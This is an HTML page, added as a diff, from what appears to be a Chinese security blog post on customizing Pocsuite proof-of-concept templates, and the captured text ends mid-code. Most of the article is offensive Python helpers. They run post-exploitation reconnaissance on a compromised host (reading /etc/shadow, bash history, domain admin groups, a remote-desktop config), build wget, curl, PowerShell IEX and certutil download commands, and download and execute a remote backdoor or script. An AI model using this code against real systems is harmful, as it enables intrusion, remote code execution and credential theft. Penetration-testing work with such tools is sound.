@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fuming">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="pocsuite 模板修改前言实习写了不少 pocsuite 的 poc ，除过利用方式外，其他东西其实都大差不差，之前每次都是复制之前的代码，比较麻烦，所以准备修改一下 pocsuite -n 的模板，一劳永逸，之后的 poc 之需要关心其利用方式的实现即可。 相关函数编写命令执行获取信息123456789101112131415161718192021222324252627282930313">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pocsuite 模板修改">
+<meta property="og:url" content="https://fuyoumingyan.github.io/2024/01/07/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/pocsuite%20%E6%A8%A1%E6%9D%BF%E4%BF%AE%E6%94%B9/index.html">
+<meta property="og:site_name" content="fuyoumingyan&#39;s blog">
+<meta property="og:description" content="pocsuite 模板修改前言实习写了不少 pocsuite 的 poc ，除过利用方式外，其他东西其实都大差不差，之前每次都是复制之前的代码，比较麻烦，所以准备修改一下 pocsuite -n 的模板，一劳永逸，之后的 poc 之需要关心其利用方式的实现即可。 相关函数编写命令执行获取信息123456789101112131415161718192021222324252627282930313">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107162649718.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107162740984.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107173142204.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107173428126.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181136283.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107174102277.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181420694.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107181745322.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107182103182.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107183215894.png">
+<meta property="og:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107183234173.png">
+<meta property="article:published_time" content="2024-01-07T10:41:50.000Z">
+<meta property="article:modified_time" content="2024-01-07T10:49:51.247Z">
+<meta property="article:author" content="fuming">
+<meta property="article:tag" content="源码学习">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20240107162649718.png">
+  
+  
+  
+  <title>pocsuite 模板修改 - fuyoumingyan&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fuyoumingyan.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fuyoumingyan&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pocsuite 模板修改"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-07 18:41" pubdate>
+          2024年1月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          21k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          118 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pocsuite 模板修改</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="pocsuite-模板修改"><a href="#pocsuite-模板修改" class="headerlink" title="pocsuite 模板修改"></a>pocsuite 模板修改</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习写了不少 pocsuite 的 poc ，除过利用方式外，其他东西其实都大差不差，之前每次都是复制之前的代码，比较麻烦，所以准备修改一下 pocsuite -n 的模板，一劳永逸，之后的 poc 之需要关心其利用方式的实现即可。</p>
+<h2 id="相关函数编写"><a href="#相关函数编写" class="headerlink" title="相关函数编写"></a>相关函数编写</h2><h3 id="命令执行获取信息"><a href="#命令执行获取信息" class="headerlink" title="命令执行获取信息"></a>命令执行获取信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rce_get_info_by_exec</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 直接命令执行收集 windows、linux 的信息</span><br>    <span class="hljs-keyword">if</span> self.get_os_type() == <span class="hljs-string">&#x27;windows&#x27;</span>:<br>        <span class="hljs-keyword">return</span> [<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ipconfig&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;ipconfig&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;hostname&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;tasklist&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;tasklist&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;netstat&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;netstat&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;net user&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;net user&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;net user /domain&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;net user /domain&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;net group /domain&quot;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;net group /domain&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;net group &quot;domain admins&quot; /domain&#x27;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;net group &quot;domain admins&quot; /domain&#x27;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;route print&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;route print&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;net share&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;net share&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&#x27;net group &quot;domain computers&quot; /domain &#x27;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;net group &quot;domain computers&quot; /domain&#x27;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;nltest /domain_trusts&quot;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;nltest /domain_trusts&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Config.ini&quot;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;type C:\Program Files\ToDesk\Config.ini&quot;</span>)&#125;,<br>            &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hosts&quot;</span>,<br>             <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;type C:\Windows\System32\drivers\etc\hosts&quot;</span>)&#125;,<br>        ]<br>    <span class="hljs-keyword">return</span> [<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;id&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;hostname&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;uname -a&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;uname -a&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat /etc/passwd&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;/etc/hosts&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat /etc/hosts&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;df -a&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;df -a&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cat /etc/issue&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat /etc/issue&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;last -n 30&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;last -n 30&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ps -ef&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;ps -ef&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ip add&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;ip add&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cat /etc/shadow&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat /etc/shadow&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cat /etc/resolv.conf&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;crontab -l&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;crontab -l&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;cat ~/.bash_history&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;cat ~/.bash_history&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;netstat -tenp&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;netstat -tenp&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;netstat -tlnp&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;netstat -tlnp&quot;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;arp -a&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;arp -a&quot;</span>)&#125;,<br>    ]<br></code></pre></td></tr></table></figure>
+
+<h3 id="无回显获取信息-download"><a href="#无回显获取信息-download" class="headerlink" title="无回显获取信息(download)"></a>无回显获取信息(download)</h3><p>下载 sh &#x2F; bat 文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rce_get_info_by_file</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># 解析通过 bat / sh 文件下载执行进行信息收集的结果</span><br>    <span class="hljs-keyword">try</span>:<br>        res = requests.get(url=url, headers=headers, verify=<span class="hljs-literal">False</span>)<br>        info = []<br>        <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span>:<br>            results = res.text.split(<span class="hljs-string">&quot;---------------------------&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(results) &lt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> info<br>            <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>                data = result.split(<span class="hljs-string">&quot;=&gt;&quot;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">continue</span><br>                info.append(&#123;<br>                    <span class="hljs-string">&#x27;name&#x27;</span>: data[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>),<br>                    <span class="hljs-string">&#x27;result&#x27;</span>: data[<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>),<br>                &#125;)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> info<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_download_commands</span>(<span class="hljs-params">self, download_url, save_path</span>):<br>    <span class="hljs-comment"># 获取 windows、linux 的下载命令, 无法判断系统类型就都返回</span><br>    commands = &#123;<br>        <span class="hljs-string">&#x27;linux&#x27;</span>: [<br>            <span class="hljs-string">f&#x27;wget <span class="hljs-subst">&#123;download_url&#125;</span> -O <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;curl <span class="hljs-subst">&#123;download_url&#125;</span> -o <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>        ],<br>        <span class="hljs-string">&#x27;windows&#x27;</span>: [<br>            <span class="hljs-string">f&#x27;curl <span class="hljs-subst">&#123;download_url&#125;</span> -o <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">f&#x27;powershell.exe -Command &quot;Invoke-WebRequest -Uri <span class="hljs-subst">&#123;download_url&#125;</span> -OutFile <span class="hljs-subst">&#123;save_path&#125;</span>&quot;&#x27;</span>,<br>            <span class="hljs-string">f&#x27;powershell.exe -Command &quot;IEX(New-Object Net.WebClient).DownloadFile(\&#x27;<span class="hljs-subst">&#123;download_url&#125;</span>\&#x27;, <span class="hljs-subst">&#123;save_path&#125;</span>)&quot;&#x27;</span>,<br>            <span class="hljs-string">f&#x27;certutil.exe -urlcache -split -f <span class="hljs-subst">&#123;download_url&#125;</span> <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>,<br>        ]<br>    &#125;<br>    <span class="hljs-keyword">return</span> commands[<span class="hljs-string">&#x27;linux&#x27;</span>] + commands[<span class="hljs-string">&#x27;windows&#x27;</span>] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.get_os_type() <span class="hljs-keyword">else</span> commands[self.get_os_type()]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file_to_exec</span>(<span class="hljs-params">self, download_url, save_path,result_url</span>):<br>    <span class="hljs-comment"># windows 、linux 下载远程 url 的文件并执行 =&gt; 无法判断是否下载成功 所以每个下载命令都下载执行一次</span><br>    <span class="hljs-comment"># 当执行后可以请求获取到信息时 证明 OK 返回</span><br>    <span class="hljs-comment"># 当无回显时 直接把所有的下载命令都执行一遍 ( os_type = &#x27;&#x27; )</span><br>    <span class="hljs-comment"># 用于无法获取返回结果的情况, 直接远程下载后门或 sh、bat 文件进行信息收集</span><br>    commands = self.get_download_commands(download_url, save_path)<br>    os_type = self.get_os_type()<br>    <span class="hljs-keyword">if</span> os_type == <span class="hljs-string">&#x27;linux&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> os_type:<br>        <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> commands:<br>            self.<span class="hljs-built_in">exec</span>(command)<br>            self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">f&#x27;chmod +x <span class="hljs-subst">&#123;save_path&#125;</span>&#x27;</span>)<br>            self.<span class="hljs-built_in">exec</span>(save_path)<br>            time.sleep(<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">if</span> check_url_by_status_code(result_url):<br>                <span class="hljs-keyword">return</span> result_url<br>        <span class="hljs-keyword">if</span> os_type:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> command <span class="hljs-keyword">in</span> commands:<br>        self.<span class="hljs-built_in">exec</span>(command)<br>        self.<span class="hljs-built_in">exec</span>(save_path)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">if</span> check_url_by_status_code(result_url):<br>            <span class="hljs-keyword">return</span> result_url<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="文件读取获取敏感文件"><a href="#文件读取获取敏感文件" class="headerlink" title="文件读取获取敏感文件"></a>文件读取获取敏感文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_info</span>(<span class="hljs-params">self</span>):<br>    info = []<br>    passwd = self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<br>    info.extend([<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: passwd&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/shadow&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;/etc/shadow&#x27;</span>)&#125;,<br>        &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;hosts&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/etc/hosts&quot;</span>, <span class="hljs-string">&quot;result&quot;</span>: self.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;/etc/hosts&#x27;</span>)&#125;,<br>        &#123;<span 